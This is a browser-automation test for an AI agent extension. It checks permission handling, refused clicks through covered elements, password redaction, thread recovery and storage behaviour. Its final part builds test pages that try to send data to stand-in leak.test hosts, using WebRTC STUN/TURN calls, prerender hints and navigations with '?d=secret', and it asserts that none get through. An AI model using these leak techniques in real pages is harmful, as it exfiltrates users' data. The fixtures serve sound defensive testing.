// Focused fresh-eyes review in a disposable real Chrome profile, no provider key.
// usage: SPINDLE_BROWSER=... [SPINDLE_SHOTS=DIR] node chrome/tests/review_browser.mjs DIST
// (SPINDLE_SHOTS: pictures of the tasks' cards, lines and reports, at a side panel's width)
import assert from 'node:assert/strict';
import fs from 'node:fs';
import dgram from 'node:dgram';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { launch, open } from './cdp.mjs';

const [distArg] = process.argv.slice(2);
assert.ok(distArg && process.env.SPINDLE_BROWSER, 'SPINDLE_BROWSER=... node review_browser.mjs DIST');
const work = fs.mkdtempSync(join(tmpdir(), 'spindle-review-'));
/** Chrome's net log: every name it looked up (read once it has closed). */
const netLog = join(work, 'net-log.json');
const shots = process.env.SPINDLE_SHOTS ? resolve(process.env.SPINDLE_SHOTS) : null;
let browser;
const replies = [];
let requests = 0;
/** The last request's body. */
let lastBody = '';
/** What the covered page's button registered (a click that should never land). */
let coveredClicks = 0;
const server = http.createServer(async (request, response) => {
  if (request.url === '/page') {
    response.writeHead(200, { 'content-type': 'text/html' }).end('<title>Review page</title><p>Review</p>');
    return;
  }
  if (request.url === '/covered') {
    response.writeHead(200, { 'content-type': 'text/html' }).end(`<title>Covered page</title>
<button id="go" onclick="fetch('/clicked')" style="margin:40px">Go</button>
<div style="position:fixed;inset:0;background:rgba(0,0,0,.3)">Cookie banner</div>`);
    return;
  }
  if (request.url === '/moving') {
    // The field is replaced as the click lands on it: the click reaches the page, typing
    // cannot follow.
    response.writeHead(200, { 'content-type': 'text/html' }).end(`<title>Moving page</title>
<input aria-label="Name" style="margin:40px" onmousedown="this.replaceWith(Object.assign(document.createElement('input'), { ariaLabel: 'Name' }))">
<input type="password" aria-label="Secret" value="mirrored-secret">`);
    return;
  }
  if (request.url === '/clicked') {
    coveredClicks += 1;
    response.writeHead(204).end();
    return;
  }
  const parts = [];
  for await (const part of request) parts.push(part);
  requests += 1;
  // A reply meant for one prompt (`for`) waits for it, so no other request takes it.
  const body = Buffer.concat(parts).toString();
  lastBody = body;
  // `for`: text the request carries, or a test of its body.
  const at = replies.findIndex((reply) => !reply.for || (typeof reply.for === 'function' ? reply.for(body) : body.includes(reply.for)));
  let reply = (at >= 0 ? replies.splice(at, 1)[0] : null) ?? { content: 'ready' };
  // A reply held back until the test lets it go (its turn runs meanwhile).
  if (reply.hold) await reply.hold;
  // A reply that depends on what the model was just told (a ref a tool returned).
  if (reply.from) reply = reply.from(body);
  if (reply.refuse) { response.writeHead(reply.refuse).end('refused'); return; }
  // Cut off once the answer began: whether the request was billed is unknown.
  if (reply.cut) {
    response.writeHead(200, { 'content-type': 'text/event-stream' });
    response.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: 'start' } }] })}\n\n`);
    setTimeout(() => response.socket.destroy(), 50);
    return;
  }
  response.writeHead(200, { 'content-type': 'text/event-stream' });
  const delta = reply.tool ? { tool_calls: [{ index: 0, id: `call-${requests}`, type: 'function', function: { name: reply.tool, arguments: JSON.stringify(reply.input) } }] } : { content: reply.content };
  for (const part of [{ choices: [{ index: 0, delta }] }, { choices: [{ index: 0, delta: {}, finish_reason: reply.tool ? 'tool_calls' : 'stop' }] }]) response.write(`data: ${JSON.stringify(part)}\n\n`);
  response.end('data: [DONE]\n\n');
});
const port = await new Promise((done) => server.listen(0, '127.0.0.1', () => done(server.address().port)));
process.on('exit', () => { browser?.child.kill('SIGKILL'); fs.rmSync(work, { recursive: true, force: true }); });
try {
  const dist = join(work, 'extension');
  fs.cpSync(resolve(distArg), dist, { recursive: true });
  const manifest = JSON.parse(fs.readFileSync(join(dist, 'manifest.json')));
  manifest.host_permissions = manifest.optional_host_permissions;
  fs.writeFileSync(join(dist, 'manifest.json'), JSON.stringify(manifest));
  browser = await launch(process.env.SPINDLE_BROWSER, { profile: join(work, 'profile'), args: [`--log-net-log=${netLog}`] });
  const { id: extension } = await browser.send('Extensions.loadUnpacked', { path: dist });
  const page = await open(browser, `chrome-extension://${extension}/panel.html`);
  const logs = [];
  browser.on(({ method, params, sessionId }) => {
    if (sessionId !== page.sessionId) return;
    if (method === 'Runtime.consoleAPICalled') logs.push(params.args.map((arg) => arg.value ?? arg.description ?? '').join(' '));
    if (method === 'Runtime.exceptionThrown') logs.push(params.exceptionDetails.exception?.description ?? params.exceptionDetails.text);
  });
  await page.until('spindlePanel?.engine');
  await page.eval(`globalThis.rpc = (() => {
    const channel = new BroadcastChannel('spindle-engine'); const pending = new Map(); let next = 0;
    channel.onmessage = ({ data }) => { if (data?.to !== 'review') return; const wait = pending.get(data.id); if (!wait) return; pending.delete(data.id); clearTimeout(wait.timer); data.ok ? wait.resolve(data.result) : wait.reject(new Error(data.error.message)); };
    return (op, args = {}) => new Promise((resolve, reject) => { const id = ++next; const timer = setTimeout(() => { pending.delete(id); reject(new Error(op + ' did not answer in 15 s')); }, 15000); pending.set(id, { resolve, reject, timer }); channel.postMessage({ to: 'engine', from: 'review', id, op, args }); });
  })()`);
  const catalog = { version: 4, active_provider: 'review', providers: [{ id: 'review', display_name: 'Review', api_provider: 'openai', request_contract: 'openai-chat-completions', base_url: `http://127.0.0.1:${port}/v1`, default_model: 'review-model', requires_api_key: false, models: ['review-model'] }] };
  const catalogPath = join(work, 'providers.json');
  fs.writeFileSync(catalogPath, JSON.stringify(catalog));
  await page.files('#catalog-file', [catalogPath]);
  await page.until(`spindlePanel.engine.catalog.providers.some((profile) => profile.id === 'review')`);
  await page.eval(`document.querySelector('#settings-dialog').open && document.querySelector('#settings-dialog').close()`);
  const rpc = (op, args = {}) => page.eval(`rpc(${JSON.stringify(op)}, ${JSON.stringify(args)})`);
  // A new thread's index entry is idle until its first turn marks it running: the
  // engine itself says when the turn has ended.
  const settled = async (id) => {
    await page.until(`spindlePanel.threads.get(${JSON.stringify(id)})?.state === 'idle'`, { what: `${id} to finish` });
    for (const until = Date.now() + 60_000; ; await new Promise((done) => setTimeout(done, 100))) {
      const opened = await rpc('open', { id });
      if (!opened.running && opened.thread.state === 'idle') return;
      if (Date.now() > until) throw new Error(`${id} did not finish: ${opened.thread.state}`);
    }
  };
  replies.push({ tool: 'write_file', input: { path: 'notes.md', content: '# Notes\n' } }, { content: 'done' });
  const { id } = await rpc('create', { provider: 'review', runner: 'none', text: 'first' });
  await settled(id);
  for (let n = 0; n < 3; n++) {
    await rpc('send', { id, text: `message ${n}` });
    await settled(id);
    try {
      const files = await rpc('turnFiles', { id });
      assert.equal(files.files[0].path, 'notes.md');
    } catch (error) { throw new Error(`turnFiles after message ${n}: ${error.message}`); }
  }
  console.log('ok workspace history after several turns');

  // A delayed permission answer must neither duplicate a send nor eat a newer draft.
  await page.click(`#threads .thread-row[data-id="${id}"]`);
  await page.until(`spindlePanel.current === '${id}' && spindlePanel.status`);
  await page.until(`document.querySelector('#history .workspace-card .ws-tree')`, { what: 'workspace card after several turns' });
  await page.eval(`chrome.permissions.request = () => new Promise((done) => { globalThis.permissionAnswer = done; });`);
  await page.type('#prompt', 'send this once');
  const before = requests;
  await page.eval(`document.querySelector('#composer').dispatchEvent(new Event('submit', { cancelable: true })); document.querySelector('#composer').dispatchEvent(new Event('submit', { cancelable: true })); document.querySelector('#prompt').value = 'new draft'; permissionAnswer(true);`);
  await page.until(`spindlePanel.threads.get('${id}')?.state === 'running' || document.querySelector('#history').textContent.includes('send this once')`);
  await settled(id);
  assert.equal(requests, before + 1);
  assert.equal(await page.eval(`document.querySelector('#prompt').value`), 'new draft');
  console.log('ok one send while permission waits, newer draft retained');

  // Camera waits for permission; declining does not call captureVisibleTab at all.
  await page.eval(`globalThis.captures = 0; chrome.tabs.captureVisibleTab = async () => { captures++; return 'data:image/png;base64,AA=='; };`);
  await page.eval(`document.querySelector('#add').getAttribute('aria-expanded') === 'true' || document.querySelector('#add').click()`);
  await page.click('#shoot');
  assert.equal(await page.eval('captures'), 0);
  await page.eval('permissionAnswer(false)');
  await page.until(`document.querySelector('#toast').textContent.includes('did not let')`);
  assert.equal(await page.eval('captures'), 0);
  await page.eval(`document.querySelector('#add').getAttribute('aria-expanded') === 'true' || document.querySelector('#add').click()`);
  await page.click('#shoot');
  await page.eval('permissionAnswer(true)');
  await page.until('captures === 1');
  console.log('ok camera permission precedes capture');

  // The send above went once and only once, however late a second one would come.
  assert.equal(requests, before + 1, 'no late second send of the message sent while permission waited');
  const tab = await open(browser, `http://127.0.0.1:${port}/page`);
  await page.eval(`(async () => { const shared = await import('./shared.mjs'); await shared.write('kv', 'pages', { reading: true, acting: true }); })()`);
  // Chrome tab IDs, unlike DevTools target IDs, come from the extension API.
  const tabId = await page.eval(`chrome.tabs.query({}).then((tabs) => tabs.find((tab) => tab.url === 'http://127.0.0.1:${port}/page').id)`);
  replies.push({ for: 'wait on the page', tool: 'wait_for', input: { text: 'never arrives', seconds: 25, tab: tabId } });
  const waiting = await rpc('create', { provider: 'review', runner: 'none', text: 'wait on the page' });
  await page.eval(`document.querySelector('#home').click()`);
  await page.click(`#threads .thread-row[data-id="${waiting.id}"]`);
  await page.until(`document.querySelector('#history .tool[data-tool="wait_for"]')`, { what: 'the pending page wait' });
  const stopAt = Date.now();
  await rpc('stop', { id: waiting.id });
  await page.until(`spindlePanel.threads.get('${waiting.id}')?.state === 'stopped'`);
  assert.ok(Date.now() - stopAt < 3000, 'Stop does not wait for the 25-second page wait');
  console.log('ok Stop cancels a real page wait');
  await tab.close();

  // A click whose target is covered (a banner over the page) is refused, not landed on the
  // banner; the tool says what covers it.
  const covered = await open(browser, `http://127.0.0.1:${port}/covered`);
  const coveredId = await page.eval(`chrome.tabs.query({}).then((tabs) => tabs.find((tab) => tab.url === 'http://127.0.0.1:${port}/covered').id)`);
  replies.push(
    { for: 'click the covered button', tool: 'page_elements', input: { tab: coveredId } },
    { for: 'click the covered button', from: (body) => ({ tool: 'click', input: { ref: /button \\"Go\\" \[([a-z]{3}\d+)\]/.exec(body)?.[1] ?? 'k0', tab: coveredId } }) },
    { for: 'click the covered button', content: 'done' },
  );
  const coveredThread = await rpc('create', { provider: 'review', runner: 'none', text: 'click the covered button' });
  await settled(coveredThread.id);
  const told = await page.eval(`(async () => (await rpc('open', { id: ${JSON.stringify(coveredThread.id)} })).history.messages.flatMap((m) => m.content ?? []).filter((b) => b.type === 'tool_result').map((b) => JSON.stringify(b.content)).join(' '))()`).catch((error) => String(error.message));
  assert.equal(coveredClicks, 0, 'nothing was clicked through the banner');
  assert.match(told, /covered by/, `the click said what covers it: ${told.slice(0, 300)}`);
  console.log('ok a covered target is refused, not clicked through');
  await covered.close();

  // Typing whose click reached the page but could not finish is unknown, not a plain
  // failure (it may have acted); the page's HTML keeps a mirrored password out.
  const moving = await open(browser, `http://127.0.0.1:${port}/moving`);
  const movingId = await page.eval(`chrome.tabs.query({}).then((tabs) => tabs.find((tab) => tab.url === 'http://127.0.0.1:${port}/moving').id)`);
  replies.push(
    { for: 'type into the moving field', tool: 'page_elements', input: { tab: movingId } },
    { for: 'type into the moving field', from: (body) => ({ tool: 'type', input: { ref: /textbox \\"Name\\"[^[]*\[([a-z]{3}\d+)\]/.exec(body)?.[1] ?? 'k0', text: 'Ada', tab: movingId } }) },
    { for: 'type into the moving field', tool: 'page_html', input: { tab: movingId } },
    { for: 'type into the moving field', content: 'done' },
  );
  const movingThread = await rpc('create', { provider: 'review', runner: 'none', text: 'type into the moving field' });
  await settled(movingThread.id);
  const results = await page.eval(`(async () => (await rpc('open', { id: ${JSON.stringify(movingThread.id)} })).history.messages.flatMap((m) => m.content ?? []).filter((b) => b.type === 'tool_result').map((b) => JSON.stringify(b.content)))()`);
  assert.equal(results.length, 3, `three tool results: ${results.join(' | ').slice(0, 600)}`);
  assert.match(results[1], /could not confirm whether this call ran: it began acting on the page, then failed \(.*not on this page any more/, results[1]);
  assert.doesNotMatch(results[1], /asked again/, results[1]);
  assert.match(results[2], /type=\\"password\\"/, 'the HTML was read');
  assert.doesNotMatch(results[2], /mirrored-secret/, 'no password in the HTML');
  console.log('ok an action cut off after it reached the page is unknown; page_html hides passwords');
  await moving.close();

  // Invalid restart settings must not erase or send a failed first turn again.
  replies.push({ refuse: 401 });
  const failed = await rpc('create', { provider: 'review', runner: 'none', text: 'keep this original' });
  await page.until(`spindlePanel.threads.get('${failed.id}')?.state === 'failed'`);
  const old = await rpc('open', { id: failed.id });
  const beforeRestart = requests;
  await assert.rejects(rpc('restart', { id: failed.id, changes: { effort: 'not-an-effort' } }));
  const kept = await rpc('open', { id: failed.id });
  assert.deepEqual(kept.history, old.history);
  assert.equal(kept.thread.state, 'failed');
  assert.equal(requests, beforeRestart);
  console.log('ok invalid restart leaves the original and sends nothing');
  await page.eval(`(async () => {
    const shared = await import('./shared.mjs');
    const kept = await rpc('export', { id: '${failed.id}', keep: true });
    const backup = 'prior:${failed.id}:review';
    await shared.write('bundles', backup, { bytes: kept.bytes });
    await shared.write('kv', 'reset:${failed.id}', { type: 'reset', id: '${failed.id}', backup });
    // And a file a move wrote before the engine stopped short of sealing the thread.
    await shared.write('bundles', '${failed.id}', { bytes: kept.bytes, name: 'cut-short.spindle' });
    await chrome.offscreen.closeDocument();
    await shared.startEngine();
  })()`);
  await page.until(`import('./shared.mjs').then((shared) => shared.read('kv', 'reset:${failed.id}')).then((record) => !record)`, { what: 'reset recovery after engine restart', timeout: 20_000 });
  const recovered = await rpc('open', { id: failed.id });
  assert.deepEqual(recovered.history, old.history);
  assert.equal(await page.eval(`import('./shared.mjs').then((shared) => shared.read('kv', 'reset:${failed.id}')).then(Boolean)`), false);
  // Restored, the backup goes: no reset is using it; nor the cut-short move's stale file
  // (the thread is still here, whole).
  assert.equal(await page.eval(`import('./shared.mjs').then((shared) => shared.keysOf('bundles')).then((keys) => keys.filter((key) => key.startsWith('prior:')).length)`), 0, 'no reset backup is kept');
  assert.equal(await page.eval(`import('./shared.mjs').then((shared) => shared.read('bundles', '${failed.id}')).then(Boolean)`), false, 'the stale file of a move cut short goes');
  console.log('ok interrupted reset restores its saved record after engine restart, and its backup goes');
  // A reset that succeeds (the first message taken back) keeps no backup either.
  replies.push({ refuse: 401 });
  const over = await rpc('create', { provider: 'review', runner: 'none', text: 'start over' });
  await page.until(`spindlePanel.threads.get('${over.id}')?.state === 'failed'`);
  const taken = await rpc('restart', { id: over.id, resend: false });
  assert.equal(taken.text, 'start over');
  assert.equal(await page.eval(`import('./shared.mjs').then((shared) => shared.keysOf('bundles')).then((keys) => keys.filter((key) => key.startsWith('prior:')).length)`), 0, 'a finished reset keeps no backup');
  console.log('ok a reset that succeeds keeps no backup');
  // A move sealed before the index update must still show as moved after restart.
  const moved = await rpc('create', { provider: 'review', runner: 'none', text: 'move' });
  await settled(moved.id);
  await rpc('export', { id: moved.id });
  await page.eval(`(async () => { const shared = await import('./shared.mjs'); await shared.update('threads', '${moved.id}', (thread) => ({ ...thread, state: 'idle' })); await chrome.offscreen.closeDocument(); await shared.startEngine(); })()`);
  await page.until(`import('./shared.mjs').then((shared) => shared.read('threads', '${moved.id}')).then((thread) => thread.state === 'moved')`, { what: 'sealed move reconciled' });
  assert.equal((await rpc('open', { id: moved.id })).thread.state, 'moved');
  console.log('ok sealed move reconciles a stale thread index');
  // Moving it already let its sealed store go (its file read back whole): its fence alone
  // says where it went, and freeing its copy checks the file and finds nothing left.
  const movedUsage = (await rpc('storage')).threads.find((entry) => entry.id === moved.id);
  assert.equal(movedUsage.sealed, 0, `the move left no sealed copy: ${JSON.stringify(movedUsage)}`);
  assert.ok(movedUsage.bundle > 0, 'its file is counted');
  assert.equal((await rpc('freeSealed', { id: moved.id })).freed, 0);
  await assert.rejects(rpc('freeSealed', { id }), /only a thread moved/);
  console.log('ok a moved thread keeps one copy, its file');

  // Settings > Storage. A thread with free pages (made beside the extension by its own
  // wasm under Node, free pages left by a table made and dropped, then imported): the
  // page offers them, Free gives them back and the thread is as it was.
  const sqlite = await import('node:sqlite').catch(() => null);
  if (sqlite) {
    const { pathToFileURL } = await import('node:url');
    const glue = await import(pathToFileURL(join(dist, 'web', 'spindle_embed.js')).href);
    await glue.default({ module_or_path: fs.readFileSync(join(dist, 'web', 'spindle_embed_bg.wasm')) });
    const { EmbeddedClient } = await import(pathToFileURL(join(dist, 'clients', 'embedded.mjs')).href);
    const place = join(work, 'fragmented');
    const outside = () => new EmbeddedClient({ wasm: glue, storage: 'node', storageOptions: { journal: 'wal', note: 'review' }, fs, platform: process.platform, resolveDir: (dir) => dir, catalog, credentials: async () => ({}), fetch: globalThis.fetch });
    let maker = outside();
    replies.push({ for: 'make some notes', tool: 'write_file', input: { path: 'notes.md', content: 'kept\n' } }, { content: 'noted' });
    await maker.create(place, 'review', { runner: 'none' });
    await maker.prompt(place, 'make some notes');
    await maker.close();
    const database = join(place, 'store', 'authority.sqlite');
    const db = new sqlite.DatabaseSync(database);
    db.exec(`CREATE TABLE junk(b BLOB);
      WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM n WHERE i < 6)
      INSERT INTO junk SELECT randomblob(1048576) FROM n;
      DROP TABLE junk;`);
    db.exec('PRAGMA wal_checkpoint(TRUNCATE)');
    db.close();
    for (const end of ['-wal', '-shm']) fs.rmSync(database + end, { force: true });
    maker = outside();
    const bundle = await maker.exportSession(place, { keep: true });
    await maker.close();
    const made = await page.eval(`(async () => {
      const bytes = Uint8Array.from(atob(${JSON.stringify(Buffer.from(bundle).toString('base64'))}), (c) => c.charCodeAt(0));
      return rpc('import', { bytes, name: 'fragmented.spindle' });
    })()`);
    const roomy = made.id;
    await page.until(`spindlePanel.threads.has(${JSON.stringify(roomy)}) || null`, { what: 'the imported thread listed' });
    const history = (await rpc('open', { id: roomy })).history;
    const usage = (await rpc('storage')).threads.find((entry) => entry.id === roomy);
    assert.ok(usage.free >= 5 * 1048576, `its free pages show: ${JSON.stringify(usage)}`);
    // The page: its row offers the space, and Free gives it back.
    await page.eval(`document.querySelector('#settings').click()`);
    await page.until(`[...document.querySelectorAll('#storage .storage-row')].some((row) => /free inside/.test(row.textContent)) || null`, { what: 'the Storage rows' });
    assert.match(await page.eval(`document.querySelector('#storage-summary').textContent`), /can be freed/);
    await page.eval(`[...document.querySelectorAll('#storage .storage-row')].find((row) => /free inside/.test(row.textContent)).querySelector('.link-like').click()`);
    await page.until(`/Freed/.test(document.querySelector('#toast')?.textContent ?? '') && document.querySelector('#storage-note').hidden || null`, { what: 'the space freed', timeout: 30_000 });
    const after = (await rpc('storage')).threads.find((entry) => entry.id === roomy);
    assert.ok(after.free < 1048576 && after.bytes <= usage.bytes - 5 * 1048576, `the space went: ${JSON.stringify(after)}`);
    assert.deepEqual((await rpc('open', { id: roomy })).history, history, 'the same thread');
    assert.equal(new TextDecoder().decode(new Uint8Array(Object.values(await page.eval(`rpc('read', { id: ${JSON.stringify(roomy)}, path: 'notes.md' }).then((reply) => reply.bytes)`)))), 'kept\n');
    await page.eval(`document.querySelector('#settings-dialog').close()`);
    console.log('ok Storage shows a thread\'s free space and Free gives it back, the thread as it was');
  }

  // A first request cut off (billed or not, unknown) and tried again: the store it was
  // in is kept aside; Storage shows it, and removing it frees it.
  replies.push({ for: 'cut me off', cut: true });
  const cut = await rpc('create', { provider: 'review', runner: 'none', text: 'cut me off' });
  await page.until(`['interrupted', 'failed'].includes(spindlePanel.threads.get('${cut.id}')?.state) || null`, { what: 'the cut first request', timeout: 30_000 });
  replies.push({ for: 'cut me off', content: 'answered this time' });
  await rpc('retry', { id: cut.id });
  await settled(cut.id);
  const aside = (await rpc('storage')).threads.find((entry) => entry.id === cut.id);
  assert.ok(aside.aside > 0, `the first attempt is kept aside: ${JSON.stringify(aside)}`);
  const dropped = await rpc('dropAside', { id: cut.id });
  assert.equal(dropped.freed, aside.aside);
  assert.equal((await rpc('storage')).threads.find((entry) => entry.id === cut.id).aside, 0);
  assert.match(JSON.stringify((await rpc('open', { id: cut.id })).history), /answered this time/, 'the thread goes on');
  console.log('ok a set-aside first attempt shows in Storage and goes when removed');
  // While any thread runs, no space is freed (a compaction holds the engine meanwhile).
  let letGo = null;
  replies.push({ for: 'keep running', content: 'done at last', hold: new Promise((done) => { letGo = done; }) });
  const runner = await rpc('create', { provider: 'review', runner: 'none', text: 'keep running' });
  await page.until(`spindlePanel.threads.get('${runner.id}')?.state === 'running' || null`, { what: 'the held turn' });
  await assert.rejects(rpc('compact', { id: cut.id }), /no thread or background task/);
  letGo();
  await settled(runner.id);
  assert.equal((await rpc('compact', { id: cut.id })).session, `/threads/${cut.id}`, 'and once it is done, space is freed');
  console.log('ok no space is freed while a thread runs');

  // The file-card flow from the large suite, without unrelated turns or providers.
  await page.eval(`(async () => { const shared = await import('./shared.mjs'); await shared.write('kv', 'pages', { reading: true, acting: false }); document.querySelector('#prompt').value = ''; document.querySelector('#attached .chip button')?.click(); })()`);
  await rpc('settings', { id, changes: { runner: 'app' } });
  const report = '<title>Report</title><h1>Report</h1><script src="https://cdn.example.invalid/chart.js"></script>';
  for (let n = 0; n < 2; n++) {
    await page.activate();
    if (await page.eval(`spindlePanel.current !== '${id}'`)) {
      await page.eval(`document.querySelector('#home').click()`);
      await page.click(`#threads .thread-row[data-id="${id}"]`);
      await page.until(`spindlePanel.current === '${id}' && spindlePanel.status`);
    }
    replies.push({ tool: 'write_file', input: { path: '/workspace/report.html', content: report } },
      { tool: 'navigate', input: { url: '/workspace/report.html' } },
      { tool: 'bash', input: { command: "printf '# Notes\\n' > notes.md" } }, { content: `report ${n}` });
    await page.eval(`chrome.permissions.request = async () => true;`);
    const requestCount = requests;
    await page.type('#prompt', `make report ${n}`);
    await page.click('#send');
    for (let until = Date.now() + 10_000; requests === requestCount && Date.now() < until;) await new Promise((done) => setTimeout(done, 20));
    assert.ok(requests > requestCount, `report ${n} reached the provider`);
    await page.until(`spindlePanel.threads.get('${id}')?.state === 'idle'`, { timeout: 240_000 });
    await page.activate();
    await page.until(`document.querySelector('#history .workspace-card .ws-tree')`, { what: 'report workspace', timeout: 5000 }).catch(async (error) => {
      const details = await page.eval(`({ current: spindlePanel.current, state: spindlePanel.threads.get('${id}')?.state, text: document.querySelector('#history').innerText.slice(-1500) })`);
      const files = await rpc('turnFiles', { id }).catch((error) => error.message);
      throw new Error(`${error.message}\n${JSON.stringify({ details, files, logs })}`);
    });
    await page.until(`document.querySelector('#history .file-card[data-path="report.html"] .file-web button')`, { what: 'report web button' });
    await page.click('#history .file-card[data-path="report.html"] .file-web button');
    console.log(`ok file-card flow ${n + 1}`);
  }

  // A report among many unrelated data files, opened in a tab: it runs as it shows,
  // contained (nothing to say, nothing to let), and the data file it uses comes from the
  // workspace when it asks; reloaded fast, one frame shows it, and only the report itself
  // is read to make it ready.
  const reportPage = '<!doctype html><title>Report</title><p>Report</p><script>fetch("data/used.json").then((r) => r.json()).then((d) => parent.postMessage({ review: d.word }, "*"), (e) => parent.postMessage({ review: "failed " + e.message }, "*"))</script>';
  const reportThread = await page.eval(`(async () => {
    const bytes = (text) => new TextEncoder().encode(text);
    const files = [{ path: 'report.html', bytes: bytes(${JSON.stringify(reportPage)}) }, { path: 'data/used.json', bytes: bytes('{"word":"lazy"}') }];
    for (let n = 0; n < 40; n++) files.push({ path: 'data/unused-' + n + '.json', bytes: bytes(JSON.stringify({ filler: 'x'.repeat(100000) })) });
    return rpc('create', { provider: 'review', runner: 'none', text: 'a report and its data', files });
  })()`);
  await settled(reportThread.id);
  const viewer = await open(browser, `chrome-extension://${extension}/view.html?thread=${reportThread.id}&path=report.html`);
  await viewer.until(`document.querySelector('#view-reload') && true`, { what: 'the file tab' });
  // Heard from here on: shown again, it runs again.
  await viewer.eval(`globalThis.heard = []; addEventListener('message', ({ data }) => { if (data?.review) heard.push(data.review); }); document.querySelector('#view-reload').click()`);
  await viewer.until(`heard.includes('lazy')`, { what: 'the report to run, unasked, and get its data' });
  assert.equal(await viewer.eval(`document.querySelector('#view-note').hidden`), true, 'nothing to say about a page that runs contained');
  await viewer.eval(`heard.length = 0; for (let n = 0; n < 6; n++) document.querySelector('#view-reload').click()`);
  await viewer.until(`heard.includes('lazy')`, { what: 'the report to get its data again' });
  await viewer.until(`/file\\(s\\) read/.test(document.querySelector('#view-path').title)`, { what: 'the timings' });
  // Every earlier show has ended by now: none of them added a frame (nor did the check of
  // whether previews are contained).
  await new Promise((done) => setTimeout(done, 1500));
  assert.equal(await viewer.eval(`document.querySelectorAll('iframe').length`), 1, 'one frame after fast reloads');
  const timings = await viewer.eval(`document.querySelector('#view-path').title`);
  assert.match(timings, /, 1 file\(s\) read /, `only the report was read to make it ready: ${timings}`);
  assert.ok(!(await viewer.eval('heard')).some((said) => said.startsWith('failed')), 'no fetch failed');
  await browser.send('Target.closeTarget', { targetId: viewer.targetId }).catch(() => {});
  console.log(`ok a report runs as it shows, contained; it shows once however fast it is reloaded and reads only what it uses (${timings})`);

  // A running preview sends nothing anywhere, whatever its scripts try: WebRTC (through a
  // STUN or TURN server, or straight to an address the page gives), the same from frames
  // it makes, resource hints (a prerender fetches its address whole), and navigations of
  // a frame it makes or of its own (the browser would look the host up before refusing).
  // Names under leak.test are checked against Chrome's net log once it has closed (at
  // the end); packets and connections here, as they come.
  const udp = dgram.createSocket('udp4');
  let udpHeard = 0;
  udp.on('message', () => { udpHeard += 1; });
  const udpPort = await new Promise((done) => udp.bind(0, '127.0.0.1', () => done(udp.address().port)));
  let reached = 0;
  const target = http.createServer((request, response) => response.end());
  target.on('connection', () => { reached += 1; });
  const targetPort = await new Promise((done) => target.listen(0, '127.0.0.1', () => done(target.address().port)));
  try {
    // WebRTC through a STUN and a TURN server named for where it runs (NAME), and a page's
    // script that runs it there.
    const rtc = `try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udpPort}' }, { urls: 'stun:NAME-stun.leak.test:3478' }, { urls: 'turn:NAME-turn.leak.test:3478?transport=tcp', username: 'u', credential: 'secret' }] }); pc.createDataChannel('x'); pc.createOffer().then((offer) => pc.setLocalDescription(offer)); } catch (error) { top.postMessage({ review: 'rtc ' + error.message }, '*'); }`;
    const prelude = `const say = (word) => parent.postMessage({ review: word }, '*');
      const rtc = (name) => ${JSON.stringify(rtc)}.replaceAll('NAME', name);
      const frame = (set) => { const made = document.createElement('iframe'); set(made); document.body.append(made); return made; };
      const inner = (name) => '<script>top.postMessage({ review: ' + JSON.stringify(name) + ' }, "*"); setTimeout(() => { ' + rtc(name) + ' }, 300);<' + '/script>';`;
    const leak = `<!doctype html><body><p>Leak</p><script>${prelude}
      eval(rtc('page'));
      (async () => {
        const a = new RTCPeerConnection(), b = new RTCPeerConnection();
        a.createDataChannel('x');
        await a.setLocalDescription(await a.createOffer());
        await b.setRemoteDescription(a.localDescription);
        await b.setLocalDescription(await b.createAnswer());
        await a.setRemoteDescription(b.localDescription);
        await a.addIceCandidate({ candidate: 'candidate:1 1 udp 2122260223 127.0.0.1 ${udpPort} typ host', sdpMid: '0', sdpMLineIndex: 0 });
        say('checks ' + a.iceConnectionState);
      })().catch((error) => say('checks ' + error.message));
      frame((made) => { made.src = URL.createObjectURL(new Blob([inner('blob')], { type: 'text/html' })); });
      for (const [rel, href] of [['preconnect', 'http://preconnect.leak.test/'], ['dns-prefetch', 'http://dnsprefetch.leak.test/'], ['prerender', 'http://127.0.0.1:${targetPort}/prerender?d=secret'], ['preconnect', 'http://127.0.0.1:${targetPort}/']]) {
        const link = document.createElement('link'); link.rel = rel; link.href = href; document.head.append(link);
      }
      const child = frame(() => {});
      setTimeout(() => { child.src = 'http://child.leak.test/'; }, 300);
      setTimeout(() => { say('ran'); location.href = 'http://self.leak.test/?d=secret'; }, 1200);
    </script>`;
    // Frames written in place: Chrome (153) ends the whole preview's renderer when one of
    // them tries WebRTC under the list, so they get a page of their own.
    const framed = `<!doctype html><body><script>${prelude}
      frame((made) => { made.srcdoc = inner('srcdoc'); });
      frame((made) => { made.src = 'data:text/html,' + encodeURIComponent(inner('data')); });
    </script>`;
    const leaking = await page.eval(`rpc('create', { provider: 'review', runner: 'none', text: 'leaking pages', files: [${[['leak.html', leak], ['framed.html', framed]].map(([path, text]) => `{ path: '${path}', bytes: new TextEncoder().encode(${JSON.stringify(text)}) }`).join(', ')}] })`);
    await settled(leaking.id);
    const showing = async (path, word) => {
      const tab = await open(browser, `chrome-extension://${extension}/view.html?thread=${leaking.id}&path=${path}`);
      await tab.until(`document.querySelector('iframe#view') && true`, { what: `${path} shown` });
      await tab.eval(`globalThis.heard = []; addEventListener('message', ({ data }) => { if (data?.review) heard.push(data.review); }); document.querySelector('#view-reload').click()`);
      await tab.until(`heard.includes(${JSON.stringify(word)})`, { what: `${path} to run` });
      await new Promise((done) => setTimeout(done, 2500));
      const said = await tab.eval('heard');
      await browser.send('Target.closeTarget', { targetId: tab.targetId }).catch(() => {});
      return said;
    };
    const said = await showing('leak.html', 'ran');
    assert.ok(said.includes('checks failed'), `its connectivity checks failed at once: ${JSON.stringify(said)}`);
    assert.ok(said.includes('blob') && !said.some((word) => word.startsWith('rtc ')), `its WebRTC calls (and its frame's) all ran: ${JSON.stringify(said)}`);
    const framedSaid = await showing('framed.html', 'srcdoc');
    assert.ok(framedSaid.includes('data'), `its frames both ran: ${JSON.stringify(framedSaid)}`);
    assert.equal(udpHeard, 0, 'no WebRTC packet left a running preview');
    assert.equal(reached, 0, 'no hint or navigation of a running preview reached a host');
  } finally {
    udp.close();
    target.close();
  }
  console.log('ok a running preview sends nothing: no WebRTC (by server, by address, from its frames), hint or navigation reached anything');

  // Where previews cannot be contained (here: the tab's requests skip Spindle's service
  // worker, so preview.html comes without its Connection-Allowlist), a page shows without
  // its scripts, nothing it holds reaches a host by itself (a meta refresh, a framed or
